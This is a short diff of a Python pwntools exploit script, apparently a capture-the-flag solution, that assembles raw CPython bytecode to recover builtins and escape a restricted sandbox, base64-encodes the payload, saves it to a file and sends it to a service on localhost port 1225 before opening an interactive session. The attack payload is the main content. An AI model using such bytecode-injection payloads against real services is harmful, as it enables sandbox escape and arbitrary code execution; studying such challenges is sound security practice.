@@ -30,9 +30,9 @@ LOAD_GLOBAL_BUILTIN = opmap['LOAD_GLOBAL_BUILTIN']
 COPY = opmap['COPY']
 context.log_level = 'critical'
 
-
 CNT = 43
 CNT2 = 20
+
 code = bytes([
     # Recover builtins
     COPY, 5,
@@ -62,21 +62,14 @@ code = bytes([
     RETURN_VALUE, 0,
 ])
 
-
-
-
-print([x for x in code])
-print(len(code))
-print(sum([x for x in code]) % 17)
-
 from base64 import b64encode
 
 p = remote("localhost", 1225)
 b64code = b64encode(code)
 
-# payload = open('payload', 'w')
-# payload.write(b64code.decode())
-# payload.close()
+payload = open('payload', 'w')
+payload.write(b64code.decode())
+payload.close()
 
 p.sendline(b64code)
 p.interactive()
